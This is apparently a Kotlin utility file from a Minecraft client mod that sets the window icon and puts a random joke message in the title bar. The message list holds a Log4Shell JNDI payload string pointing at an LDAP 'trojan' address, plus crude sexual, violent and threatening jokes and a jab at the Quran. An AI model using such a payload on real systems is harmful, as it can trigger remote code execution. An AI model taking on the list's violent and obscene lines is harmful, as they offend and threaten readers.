package dev.koding.celeste.client.utils

import dev.koding.celeste.client.CelesteClient
import dev.koding.celeste.client.Client
import net.minecraft.util.Formatting

object Window {
    private val messages = arrayOf(
        "boy what the hell boy",
        "It JUST works(TM)",
        "It's a feature, trust me.",
        "Who?",
        "le trollface",
        "LITERAL money dupe",
        "ez lolz",
        "hholey shidt amongla",
        "crungus",
        "show me how them tits fart",
        "who up playin with they worm",
        "bing bong",
        "britmoji",
        "wow iphone",
        "bruh",
        "google, show me this guys balls",
        "my balls itch",
        "i like cock",
        "quran spam feature soontm",
        "\${jndi:ldap://192.168.1.1:6969/trojan}",
        "have you ever had lots of pain in the ass after a sleepover?",
        "guys DO NOT search chungus in control+f",
        "dont ever buy no gas from the gas station bro",
        "ඞ",
        "crewnmatre",
        "amangos",
        "gem shin im pact ; )",
        "i like to play with my balls",
        "i put my balls in a deep fryer",
        "i like 2 invoke torment >:)",
        "i am going to hurt you",
        "ohahh ohahh",
        "the private in question:",
        "6$",
        "arson",
        "my balls are welded to my xbox",
        "whem mom brings home the sludge",
        "i am inside your home",
        "run.",
        "ah! fuck you!",
        "frezy fast bear what happened? squi ga m !!",
        "i have a bomb",
        "he fuckin that shit up!!! eat eat eat",
        "normalize killing people",
        "aalalalalalalala",
        "192.26.78.103 /danger",
        "i am goi g to kill u w/ a rock",
        "aww, did somebody get immediately killed by shadow people?",
        "i am very ill"
    )

    private val splashText: String get() = messages.random()
    val coloredSplash = "${Formatting.values().random()}$splashText"

    fun setIcon() = mc.window.setIcon(
        CelesteClient::class.java.getResourceAsStream("/assets/celeste/textures/icon/icon16.png"),
        CelesteClient::class.java.getResourceAsStream("/assets/celeste/textures/icon/icon32.png"),
    )

    fun setTitle() = mc.window.setTitle("${Client.name} V${Client.version} - $splashText")
}